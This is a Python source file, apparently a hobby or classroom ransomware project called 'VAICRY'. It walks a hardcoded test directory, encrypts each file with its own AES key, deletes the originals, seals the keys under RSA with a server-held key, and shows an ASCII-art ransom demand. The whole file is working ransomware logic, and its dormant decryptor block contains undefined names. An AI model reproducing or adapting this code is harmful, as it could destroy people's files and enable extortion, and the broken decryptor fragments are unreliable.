import os
import string
import random
import pickle
import base64
import generate_keys
import asym
import sym
import get_files
import servkey
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

test_path = '/home/vaibhav/Desktop/Ransomware Test'


ransom_message = """
____   _________  .___________________________.___.
\   \ /   /  _  \ |   \_   ___ \______   \__  |   |
 \   Y   /  /_\  \|   /    \  \/|       _//   |   |
  \     /    |    \   \     \___|    |   \\____   |
   \___/\____|__  /___|\______  /____|_  // ______|
                \/            \/       \/ \/       

All your files have been encrypted. Why cry though when you can get them back by paying
a small fee!
Will you pay the ransom? (y/n)
"""
def decrypt_aes_keys(enc, key):
    key_obj = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key_obj)
    return cipher.decrypt(enc)

def start_encryption(files):
    aes_paths = []
    for f in files:
       key = generate_keys.generate_key(128)
       AES_cipher = sym.AESCipher(key)
       
       #f = base64.b64decode(f)
      
       try:
          with open(f, 'rb') as fi:
             file_content = fi.read()
       except:
          continue
       enc_file_content = AES_cipher.encrypt(file_content.decode('utf-8'))
       
       new_file_name = f + ".VAICRY"
       with open(new_file_name, 'wb') as fi:
          fi.write(enc_file_content)
       os.remove(f)
       #b64_file_name = base64.b64encode(new_file_name)
       #aes_path.append((key,b64_file_name))
       aes_paths.append((key,new_file_name))

    return aes_paths

def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]
    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted

def interface():
    files = get_files.find_files(test_path)
    RSA_cipher = asym.assymetric()
    RSA_cipher.generate_keys()
    
    client_private_key = RSA_cipher.private_key_PEM
    #print(client_private_key)
    client_public_key = RSA_cipher.public_key_PEM
    enc_priv_key = encrypt_priv_key(client_private_key, servkey.server_public_key)

    with open(servkey.enc_client_private_key_path, 'wb') as f:
        pickle.dump(enc_priv_key,f)

    with open(servkey.client_private_key_path, 'wb') as f:
        pickle.dump(client_private_key,f)


    with open(servkey.client_public_key_path, 'wb') as f:
        f.write(client_public_key)

    #del client_private_key
    #del RSA_cipher

    client_pub_key_encryption = RSA.importKey(client_public_key)
    client_pub_key_cipher = PKCS1_OAEP.new(client_pub_key_encryption)
    #Encryption starts from here

    aes_key_paths = start_encryption(files)
    enc_aes_key_and_path = []

    for i in aes_key_paths:
        aes_key = i[0]
        aes_path = i[1]

        enc_aes_key = client_pub_key_cipher.encrypt(aes_key)
        enc_aes_key_and_path.append((enc_aes_key, aes_path))

    #del aes_key_paths

    with open(servkey.encrypted_aes_key_and_paths_path, 'wb') as f:
        pickle.dump(enc_aes_key_and_path,f)
"""
    a = input("Do you want to decrypt the files? (y/n)")
    if(a=='y' or a=='Y'):
        #////////////////////////
        print('Decrypting the files...')
        aes_and_path = []
        for pair in enc_aes_key_and_path:
            encrypted_aes_key = pair[0]
            aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

            aes_and_path.append((aes_key, pair[1]))

        for i in aes_and_path:
            decryptor = symmetric.AESCipher(i[0])
        
            with open(i[1], 'rb') as f:
                encrypted_file_content = f.read()
        
        # decrypt content
            decrypted_file_content = decryptor.decrypt(encrypted_file_content)

            original_file_name = i[1].replace(".VAICRY", "")
            with open(old_file_name, 'w') as f:
                f.write(decrypted_file_content)
        
        # delete old encrypted file
            os.remove(i[1])

    # end of decryptor
    print("Decryption finished! Congratulations!")

#////////////////////////
"""

    #del enc_aes_key_and_path
    
if __name__ == "__main__":
    interface()
    while(True):
        print(ransom_message)
        a = input()
        if(a=='y' or a=='Y'):
            break
    p = subprocess.Popen("python3 decryptor.py", shell=True)


"""
   with open(servkey.encrypted_aes_key_and_paths_path, 'wb') as f:
        for i in enc_aes_key_and_path:
            print(i[0])
            print(i[1])
            l = i[0] + " " + i[1] + "\n"
            f.write(l)
"""
